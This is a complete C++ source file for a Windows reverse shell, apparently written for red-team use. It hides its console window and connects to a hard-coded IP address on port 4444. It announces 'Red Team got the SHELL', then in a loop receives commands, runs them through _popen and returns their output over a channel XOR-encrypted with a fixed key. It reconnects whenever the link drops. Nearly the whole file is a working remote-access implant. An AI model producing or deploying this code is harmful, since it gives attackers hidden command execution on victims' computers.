#include <iostream>         // Input/output library
#include <string>           // String library
#include <cstring>          // C-style string library
#include <cstdlib>          // General utilities library
#include <cstdint>          // Integer types library
#include <cstdio>           // Standard I/O library
#include <winsock2.h>       // Windows socket library
#include <ws2tcpip.h>       // Windows socket API extensions
#include <windows.h>        // Windows library

// Add the following line to use the std namespace implicitly.
using namespace std;

#pragma comment(lib, "ws2_32.lib")    // Link the ws2_32.lib library

// Set the IP address and port of your server
const char* HOST = "172.20.35.55";  // Remote host IP address
const int PORT = 4444;              // Remote host port number

// Set the key for the XOR encryption
const uint8_t KEY[] = { 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08 };  // Encryption key

string executeCommand(const string& command)
{
    string result = "";
    FILE* pipe = _popen(command.c_str(), "r");  // Open a pipe to execute the command
    if (pipe)
    {
        char buffer[256];
        while (!feof(pipe))
        {
            if (fgets(buffer, sizeof(buffer), pipe) != nullptr)
            {
                result += buffer;  // Append the command output to the result string
            }
        }
        _pclose(pipe);  // Close the pipe
    }
    return result;
}

uint8_t* encrypt(const string& data)
{
    size_t messageSize = data.size();
    uint8_t* encrypted_message = new uint8_t[messageSize];  // Allocate memory for the encrypted message

    for (size_t i = 0; i < messageSize; i++)
    {
        encrypted_message[i] = data[i] ^ KEY[i % sizeof(KEY)];  // XOR encryption
    }

    return encrypted_message;
}

string decrypt(const uint8_t* encrypted_message, size_t messageSize)
{
    uint8_t* decrypted_message = new uint8_t[messageSize];  // Allocate memory for the decrypted message

    for (size_t i = 0; i < messageSize; i++)
    {
        decrypted_message[i] = encrypted_message[i] ^ KEY[i % sizeof(KEY)];  // XOR decryption
    }

    string message(reinterpret_cast<char*>(decrypted_message), messageSize);  // Convert decrypted message to string
    delete[] decrypted_message;  // Deallocate memory

    return message;
}

int main()
{
    // Hide the console window
    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_HIDE);

    // Initialize WinSock
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)  // Start WinSock library
    {
        return 1;
    }

    while (true)
    {
        try
        {
            // Connect to the server
            SOCKET sockfd;
            struct sockaddr_in serverAddr;

            // Create socket
            sockfd = socket(AF_INET, SOCK_STREAM, 0);  // Create a TCP socket
            if (sockfd == INVALID_SOCKET)
            {
                WSACleanup();
                continue;
            }

            // Prepare server address structure
            serverAddr.sin_family = AF_INET;  // IPv4 address family
            serverAddr.sin_port = htons(PORT);  // Set the port number
            if (inet_pton(AF_INET, HOST, &(serverAddr.sin_addr)) <= 0)  // Convert IP address string to binary form
            {
                closesocket(sockfd);
                WSACleanup();
                continue;
            }

            // Connect to server
            if (connect(sockfd, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR)  // Connect to the server
            {
                closesocket(sockfd);
                WSACleanup();
                continue;
            }

            // Send initial message to server
            string helloMessage = "Red Team got the SHELL: ";  // Initial message to send
            uint8_t* encrypted_message = encrypt(helloMessage);  // Encrypt the message

            // Send the encrypted message to the server
            int sendResult = send(sockfd, (const char*)encrypted_message, helloMessage.size(), 0);  // Send the message
            delete[] encrypted_message;  // Deallocate memory

            if (sendResult == SOCKET_ERROR)
            {
                closesocket(sockfd);
                continue;
            }

            while (true)
            {
                // Receive the encrypted message from the server
                uint8_t encrypted_message[1024] = { 0 };  // Buffer to store the received message
                int chars_received = recv(sockfd, (char*)encrypted_message, sizeof(encrypted_message), 0);  // Receive the message

                if (chars_received <= 0)
                {
                    break;
                }

                string data = decrypt(encrypted_message, chars_received);  // Decrypt the received message
                string output = executeCommand(data);  // Execute the command and get the output
                uint8_t* encrypted_response = encrypt(output);  // Encrypt the output

                // Send the encrypted response to the server
                sendResult = send(sockfd, (const char*)encrypted_response, output.size(), 0);  // Send the response
                delete[] encrypted_response;  // Deallocate memory

                if (sendResult == SOCKET_ERROR)
                {
                    break;
                }
            }

            closesocket(sockfd);  // Close the socket
        }
        catch (const exception&)
        {
            // Sleep for a few seconds before attempting to reconnect
            Sleep(2000);
        }
    }

    WSACleanup();  // Clean up and exit the program
    return 0;
}
